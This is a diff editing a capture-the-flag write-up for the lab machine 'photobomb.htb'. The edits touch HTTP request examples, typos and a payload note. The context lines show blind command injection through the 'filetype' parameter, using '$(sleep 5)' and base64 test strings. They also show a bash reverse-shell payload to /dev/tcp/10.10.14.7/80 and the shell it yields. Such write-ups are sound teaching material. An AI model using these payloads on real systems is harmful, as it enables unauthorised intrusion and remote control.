@@ -79,7 +79,6 @@ Referer: http://photobomb.htb/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-Special-Dev: only4dev
 ```
 
 ### response
@@ -118,7 +117,7 @@ Inside the protected area is a web application which allows downloading images.
 
 ![logged in](/images/photobomb_loggedin.png)  
 
-The following `HTTP` request is normal download request for an image.
+The following `HTTP` request is a normal download request for an image.
 
 ## request
 ```http
@@ -136,7 +135,6 @@ Referer: http://photobomb.htb/printer
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-Special-Dev: only4dev
 
 photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg&dimensions=30x30
 ```
@@ -184,12 +182,13 @@ FAIL_INTENT|`echo 'aWQK' |base64 -d`
 FAIL_INTENT||`echo 'aWQK' |base64 -d`
 ```
 
-The parameter `filetype` seems to be blind injectable.  
+The parameter `filetype` seems to be blind injectable (`sleep` delay).  
 
 ![burp intruder 1](/images/photobomb_intruder1.png)  
 ![burp intruder 2](/images/photobomb_intruder2.png)
 
-We verifiy this by sending a simple `sleep` command.
+We verifiy this by sending a simple `sleep` command.  
+payload: `$(sleep 5)`
 
 ![rce poc](/images/photobomb_rce.png)
 
@@ -220,7 +219,6 @@ Referer: http://photobomb.htb/printer
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-Special-Dev: only4dev
 
 photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg$(bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/80+0>%261')&dimensions=30x30
 ```
@@ -247,7 +245,6 @@ wizard@photobomb:~/photobomb$
 ```bash
 wizard@photobomb:~/photobomb$ ls
 ls
-groups=1000(wizard)
 log
 photobomb.sh
 public
